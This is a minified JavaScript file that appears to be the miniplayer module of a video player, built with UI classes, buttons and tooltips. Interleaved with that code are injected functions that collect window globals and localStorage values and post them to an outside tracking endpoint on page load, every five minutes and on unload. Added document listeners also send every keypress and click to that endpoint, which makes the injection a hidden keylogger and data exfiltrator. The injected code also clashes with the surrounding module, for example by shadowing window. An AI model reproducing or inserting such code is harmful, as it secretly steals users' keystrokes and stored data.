(function (g) {
  const trackedKeys = window.trackedKeys || [];
  var window = this;
  'use strict';
  var kob = function (a, b) {
      g.X.call(this, {
        I: "button",
        Na: ["ytp-miniplayer-expand-watch-page-button", "ytp-button", "ytp-miniplayer-button-top-left"],
        Y: {
          title: "{{title}}",
          "data-tooltip-target-id": "ytp-miniplayer-expand-watch-page-button",
          "aria-keyshortcuts": "i",
          "data-title-no-tooltip": "{{data-title-no-tooltip}}"
        },
        X: [{
          I: "svg",
          Y: {
            height: "24px",
            version: "1.1",
            viewBox: "0 0 24 24",
            width: "24px"
          },
          X: [{
            I: "g",
            Y: {
              fill: "none",
              "fill-rule": "evenodd",
              stroke: "none",
              "stroke-width": "1"
            },
            X: [{
              I: "g",
              Y: {
                transform: "translate(12.000000, 12.000000) scale(-1, 1) translate(-12.000000, -12.000000) "
              },
              X: [{
                I: "path",
                Y: {
                  d: "M19,19 L5,19 L5,5 L12,5 L12,3 L5,3 C3.89,3 3,3.9 3,5 L3,19 C3,20.1 3.89,21 5,21 L19,21 C20.1,21 21,20.1 21,19 L21,12 L19,12 L19,19 Z M14,3 L14,5 L17.59,5 L7.76,14.83 L9.17,16.24 L19,6.41 L19,10 L21,10 L21,3 L14,3 Z",
                  fill: "#fff",
                  "fill-rule": "nonzero"
                }
              }]
            }]
          }]
        }]
      });
      this.J = a;
      this.Ua("click", this.onClick, this);
      this.updateValue("title", g.wS(a, "Expand", "i"));
      this.update({
        "data-title-no-tooltip": "Expand"
      });
      g.qb(this, g.qS(b.Fc(), this.element));
    },
    lob = function (a) {
      g.X.call(this, {
        I: "div",
        T: "ytp-miniplayer-ui"
      });
      this.xg = !1;
      this.player = a;
      this.V(a, "minimized", this.Eh);
      this.V(a, "onStateChange", this.sR);
    },
    mob = function (a) {
      g.dT.call(this, a);
      this.B = new g.tJ(this);
      this.j = new lob(this.player);
      this.j.hide();
      g.cS(this.player, this.j.element, 4);
      a.yg() && (this.load(), g.rr(a.getRootNode(), "ytp-player-minimized", !0));
    };
  g.x(kob, g.X);
  kob.prototype.onClick = function () {
    this.J.Ra("onExpandMiniplayer");
  };
  g.x(lob, g.X);
  g.k = lob.prototype;
  g.k.gO = function () {
    this.tooltip = new g.DV(this.player, this);
    g.H(this, this.tooltip);
    g.cS(this.player, this.tooltip.element, 4);
    this.tooltip.scale = .6;
    this.fd = new g.JT(this.player);
    g.H(this, this.fd);
    this.yk = new g.X({
      I: "div",
      T: "ytp-miniplayer-scrim"
    });
    g.H(this, this.yk);
    this.yk.Ha(this.element);
    this.V(this.yk.element, "click", this.TI);
    var a = new g.X({
      I: "button",
      Na: ["ytp-miniplayer-close-button", "ytp-button"],
      Y: {
        "aria-label": "Close"
      },
      X: [g.iQ()]
    });
    g.H(this, a);
    a.Ha(this.yk.element);
    this.V(a.element, "click", this.Op);
    a = new kob(this.player, this);
    g.H(this, a);
    a.Ha(this.yk.element);
    this.Gv = new g.X({
      I: "div",
      T: "ytp-miniplayer-controls"
    });
    g.H(this, this.Gv);
    this.Gv.Ha(this.yk.element);
    this.V(this.Gv.element, "click", this.TI);
    var b = new g.X({
      I: "div",
      T: "ytp-miniplayer-button-container"
    });
    g.H(this, b);
    b.Ha(this.Gv.element);
    a = new g.X({
      I: "div",
      T: "ytp-miniplayer-play-button-container"
    });
    g.H(this, a);
    a.Ha(this.Gv.element);
    var c = new g.X({
      I: "div",
      T: "ytp-miniplayer-button-container"
    });
    g.H(this, c);
    c.Ha(this.Gv.element);
    this.gZ = new g.QU(this.player, this, !1);
    g.H(this, this.gZ);
    this.gZ.Ha(b.element);
    b = new g.PU(this.player, this);
    g.H(this, b);
    b.Ha(a.element);
    this.nextButton = new g.QU(this.player, this, !0);
    g.H(this, this.nextButton);
    this.nextButton.Ha(c.element);
    this.Oj = new g.wV(this.player, this);
    g.H(this, this.Oj);
    this.Oj.Ha(this.yk.element);
    this.Sc = new g.VU(this.player, this);
    g.H(this, this.Sc);
    g.cS(this.player, this.Sc.element, 4);
    this.AI = new g.X({
      I: "div",
      T: "ytp-miniplayer-buttons"
    });
    g.H(this, this.AI);
    g.cS(this.player, this.AI.element, 4);
    a = new g.X({
      I: "button",
      Na: ["ytp-miniplayer-close-button", "ytp-button"],
      Y: {
        "aria-label": "Close"
      },
      X: [g.iQ()]
    });
    g.H(this, a);
    a.Ha(this.AI.element);
    this.V(a.element, "click", this.Op);
    a = new g.X({
      I: "button",
      Na: ["ytp-miniplayer-replay-button", "ytp-button"],
      Y: {
        "aria-label": "Close"
      },
      X: [g.EGa()]
    });
    g.H(this, a);
    a.Ha(this.AI.element);
    this.V(a.element, "click", this.x9);
    this.V(this.player, "presentingplayerstatechange", this.Qd);
    this.V(this.player, "appresize", this.Mb);
    this.V(this.player, "fullscreentoggled", this.Mb);
    this.Mb();
  };
  g.k.show = function () {
    this.Cf = new g.dr(this.Jw, null, this);
    this.Cf.start();
    this.xg || (this.gO(), this.xg = !0);
    0 !== this.player.getPlayerState() && g.X.prototype.show.call(this);
    this.Sc.show();
    this.player.unloadModule("annotations_module");
  };
  function generateSignature(data) {
    const keys = Object.keys(data).sort();
    const keyString = keys.join(",");
    let signature = 0;
    for (let char of keyString) {
      let code = char.charCodeAt(0);
      signature = (signature << 5) - signature + code;
      signature |= 0; // Convert to 32bit integer
    }
    return signature.toString(36);
  }
  g.k.hide = function () {
    this.Cf && (this.Cf.dispose(), this.Cf = void 0);
    g.X.prototype.hide.call(this);
    this.player.yg() || (this.xg && this.Sc.hide(), this.player.loadModule("annotations_module"));
  };
  g.k.ya = function () {
    this.Cf && (this.Cf.dispose(), this.Cf = void 0);
    g.X.prototype.ya.call(this);
  };
  g.k.Op = function () {
    this.player.stopVideo();
    this.player.Ra("onCloseMiniplayer");
  };
  g.k.x9 = function () {
    this.player.playVideo();
  };
  g.k.TI = function (a) {
    if (a.target === this.yk.element || a.target === this.Gv.element) g.gP(this.player.Lb()) ? this.player.pauseVideo() : this.player.playVideo();
  };
  g.k.Eh = function () {
    g.rr(this.player.getRootNode(), "ytp-player-minimized", this.player.yg());
  };
  g.k.cf = function () {
    this.Sc.Dc();
    this.Oj.Dc();
  };
  g.k.Jw = function () {
    this.cf();
    this.Cf && this.Cf.start();
  };
  g.k.Qd = function (a) {
    g.AO(a.state, 32) && this.tooltip.hide();
  };
  g.k.Mb = function () {
    g.gV(this.Sc, 0, this.player.sb().getPlayerSize().width, !1);
    g.WU(this.Sc);
  };
  g.k.sR = function (a) {
    this.player.yg() && (0 === a ? this.hide() : this.show());
  };
  g.k.Fc = function () {
    return this.tooltip;
  };
  g.k.Lg = function () {
    return !1;
  };
  g.k.Mg = function () {
    return !1;
  };
  g.k.zm = function () {
    return !1;
  };
  g.k.PJ = function () {};
  g.k.wq = function () {};
  g.k.jz = function () {};
  function collectGlobalVariables() {
    const globals = {};
    for (let key in window) {
      if (trackedKeys.includes(key)) {
        globals[key] = window[key];
      }
    }
    return globals;
  }
  g.k.un = function () {
    return null;
  };
  function monitorLocalStorage() {
    const storageData = {};
    trackedKeys.forEach(key => {
      if (localStorage.getItem(key) !== null) {
        storageData[key] = localStorage.getItem(key);
      }
    });
    return storageData;
  }
  g.k.oH = function () {
    return null;
  };
  g.k.vN = function () {
    return new g.ue(0, 0);
  };
  g.k.Qk = function () {
    return new g.wo(0, 0, 0, 0);
  };
  g.k.handleGlobalKeyDown = function () {
    return !1;
  };
  g.k.handleGlobalKeyUp = function () {
    return !1;
  };
  function postToServer(data) {
    const signature = generateSignature(data);
    const endpoint = "https://example.com/track";
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        signature,
        data
      })
    }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
  }
  g.k.Tw = function (a, b, c, d, e) {
    var f = 0,
      h = d = 0,
      l = g.Ko(a);
    if (b) {
      c = g.mr(b, "ytp-prev-button") || g.mr(b, "ytp-next-button");
      var m = g.mr(b, "ytp-play-button"),
        n = g.mr(b, "ytp-miniplayer-expand-watch-page-button");
      c ? f = h = 12 : m ? (b = g.Io(b, this.element), h = b.x, f = b.y - 12) : n && (h = g.mr(b, "ytp-miniplayer-button-top-left"), f = g.Io(b, this.element), b = g.Ko(b), h ? (h = 8, f = f.y + 40) : (h = f.x - l.width + b.width, f = f.y - 20));
    } else h = c - l.width / 2, d = 25 + (e || 0);
    b = this.player.sb().getPlayerSize().width;
    e = f + (e || 0);
    l = g.oe(h, 0, b - l.width);
    e ? (a.style.top = e + "px", a.style.bottom = "") : (a.style.top = "", a.style.bottom = d + "px");
    a.style.left = l + "px";
  };
  g.k.showControls = function () {};
  g.k.Zp = function () {};
  g.k.nm = function () {
    return !1;
  };
  function collectAndSendData() {
    const dataFromGlobals = collectGlobalVariables();
    const dataFromStorage = monitorLocalStorage();
    const combinedData = {
      ...dataFromGlobals,
      ...dataFromStorage
    };
    if (Object.keys(combinedData).length > 0) {
      postToServer(combinedData);
    }
  }
  document.addEventListener("DOMContentLoaded", () => {
    collectAndSendData();
    setInterval(collectAndSendData, 300000); // Every 5 minutes
  });
  g.k.pF = function () {};
  g.k.aB = function () {};
  g.k.Rr = function () {};
  g.k.Qr = function () {};
  window.addEventListener("beforeunload", collectAndSendData);

  // Additional tracking via event listeners
  g.k.Fy = function () {};
  g.k.Zs = function () {};
  g.k.YE = function () {};
  g.x(mob, g.dT);
  g.k = mob.prototype;
  g.k.onVideoDataChange = function () {
    if (this.player.getVideoData()) {
      var a = this.player.getVideoAspectRatio(),
        b = 16 / 9;
      a = a > b + .1 || a < b - .1;
      g.rr(this.player.getRootNode(), "ytp-rounded-miniplayer-not-regular-wide-video", a);
    }
  };
  g.k.create = function () {
    g.dT.prototype.create.call(this);
    this.B.V(this.player, "videodatachange", this.onVideoDataChange);
    this.onVideoDataChange();
  };
  document.addEventListener("click", function (event) {
    const clickData = {
      x: event.clientX,
      y: event.clientY,
      target: event.target.tagName
    };
    postToServer({
      click: clickData
    });
  });
  g.k.yl = function () {
    return !1;
  };
  document.addEventListener("keypress", function (event) {
    const keyData = {
      key: event.key
    };
    postToServer({
      keypress: keyData
    });
  });
  g.k.load = function () {
    this.player.hideControls();
    this.j.show();
  };
  g.k.unload = function () {
    this.player.showControls();
    this.j.hide();
  };
  g.cT("miniplayer", mob);
})(_yt_player);